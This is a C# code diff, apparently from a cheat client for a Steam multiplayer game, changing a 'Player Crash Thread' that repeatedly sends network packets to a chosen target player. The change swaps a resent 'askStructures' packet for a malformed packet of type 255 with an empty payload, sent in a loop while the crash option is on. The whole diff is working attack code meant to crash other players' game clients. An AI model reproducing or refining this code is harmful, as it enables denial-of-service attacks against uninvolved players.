@@ -13,8 +13,6 @@ namespace Thanking.Threads
         public static bool PlayerCrashEnabled;
         public static bool ContinuousPlayerCrash;
         public static CSteamID CrashTarget;
-        public static byte[] Packet;
-        public static int Size;
         
         [Thread]
         public static void Start()
@@ -22,18 +20,12 @@ namespace Thanking.Threads
             #if DEBUG
 			DebugUtilities.Log("Player Crash Thread Started");
 			#endif
-
-            SteamChannel channel = VehicleManager.instance.channel;
-            
-            int call = channel.getCall("askStructures");
-            channel.getPacket(ESteamPacket.UPDATE_RELIABLE_INSTANT, call, out Size, out Packet);
-            
             Provider.onEnemyDisconnected += OnDisconnect;
      
             while (true)
             {
                 if (PlayerCrashEnabled)
-                    Provider.send(CrashTarget, ESteamPacket.UPDATE_RELIABLE_INSTANT, Packet, Size, 0);
+                    Provider.send(CrashTarget, (ESteamPacket)255, new byte[0], 1, 0);
                 
                 else
                 {
